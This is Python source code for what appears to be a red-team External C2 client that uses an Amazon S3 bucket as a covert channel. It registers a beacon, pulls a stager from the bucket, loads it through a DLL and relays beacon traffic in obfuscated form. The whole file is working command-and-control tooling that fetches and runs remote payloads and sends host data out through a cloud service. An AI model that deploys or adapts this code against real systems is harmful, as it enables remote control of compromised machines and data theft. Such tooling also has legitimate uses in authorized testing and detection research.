from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:
import base64
import urllib

# Transport imports:
import boto3
import uuid
from botocore.exceptions import ClientError
from time import sleep

#####################
# Bootlegged Config #
#####################

# CS-S3-Agent user credentials with full access to S3
# Instead of hardcoding, probably should hard-code an encryption
# key and store in a publicly locatable place, then decrypt and pass to client.
AWS_SECRET_KEY = 'YOUR_SECRET_KEY'
AWS_ACCESS_KEY = 'YOUR_ACCESS_KEY'

s3          = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)
bucketName  = 'YOUR_S3BUCKET'
beaconId    = str(uuid.uuid4())
taskKeyName = beaconId + ':TaskForYou'
respKeyName = beaconId + ':RespForYou'

###################
#    End Config   #
###################

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
    data = base64.b64encode(data)
    return urllib.quote_plus(data)[::-1]

def decode(data):
    data = urllib.unquote(data[::-1])
    return base64.b64decode(data)
# </encoder functions>

# <transport functions>
def prepTransport():
    return 0

def sendData(data):
    """
    Function to send data to the external C2. Before transmission
    data _must_ be encoded using whatever encode functionality is
    decided on.

    This function should be _very_ similar to the server sendData.
    """
    respKey = "{}:{}".format(respKeyName, str(uuid.uuid4()))
    print 'got body contents to send'
    s3.put_object(Body=encode(data), Bucket=bucketName, Key=respKey)
    print 'sent ' + str(len(data)) + ' bytes'

def recvData():
    """
    Function to receive data form external C2. Must decode data
    from server using decode() method.

    This function should be _very_ similar to the server retrieveData()
    """
    while True:
        try:
            resp = s3.list_objects(Bucket=bucketName, Prefix=taskKeyName)
            objects = resp['Contents']
            if objects:
                tasks = []
                for obj in objects:
                    resp = s3.get_object(Bucket=bucketName, Key=obj['Key'])
                    msg = resp['Body'].read()
                    msg = decode(msg)
                    s3.delete_object(Bucket=bucketName, Key=obj['Key'])
                    tasks.append(msg)
                return tasks
        except ClientError as e:
            if e.response['Error']['Code'] == 'NoSuchKey':
                # print '[-] No data to retrieve yet. Sleeping...'
                sleep(5)
            else:
                raise e
        except KeyError as e:
            # Received no tasks
            sleep(5)

def registerClient():
    """
    Function to register new beacon in external c2.
    This should submit a unique identifier for the server to
    identify the client with.

    In this example, we put a new string AGENT:UUID into
    the bucket to notify the server that a new agent is registering
    with beaconId=uuid
    """
    keyName = "AGENT:{}".format(beaconId)
    s3.put_object(Body="", Bucket=bucketName, Key=keyName)
    print "[+] Registering new agent {}".format(keyName)

# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
    return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
    mem = create_string_buffer(maxlen)
    l = lib.read_frame(hPipe,mem,maxlen)
    if l < 0: return(-1)
    chunk=mem.raw[:l]
    return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
    sys.stdout.write('wp: %s\n'%len(chunk))
    sys.stdout.flush()
    print chunk
    ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
    sleep(3) 
    print "ret=%s"%ret
    return(ret)

def go():
    # Register beaconId so C2 server knows we're waiting
    registerClient()
    # LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
    print "Waiting for stager..." # DEBUG
    p = recvData()
    # First time initialization, only one task returned.
    p = p[0]
    print "Got a stager! loading..."
    sleep(2)
    # print "Decoded stager = " + str(p) # DEBUG
    # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
    handle_beacon = start_beacon(p)

    # Grabbing and relaying the metadata from the SMB pipe is done during interact()
    print "Loaded, and got handle to beacon. Getting METADATA."

    return handle_beacon

def interact(handle_beacon):
    while(True):
        sleep(1.5)
        
        # LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
        chunk = ReadPipe(handle_beacon)
        if chunk < 0:
            print 'readpipe %d' % (len(chunk))
            break
        else:
            print "Received %d bytes from pipe" % (len(chunk))
        print "relaying chunk to server"
        sendData(chunk)

        # LOGIC TO CHECK FOR A NEW TASK
        print "Checking for new tasks from transport"
        
        newTasks = recvData()
        for newTask in newTasks:
            print "Got new task: %s" % (newTask)
            print "Writing %s bytes to pipe" % (len(newTask))
            r = WritePipe(handle_beacon, newTask)
            print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
    interact(handle_beacon)
except KeyboardInterrupt:
    print "Caught escape signal"
    sys.exit(0)
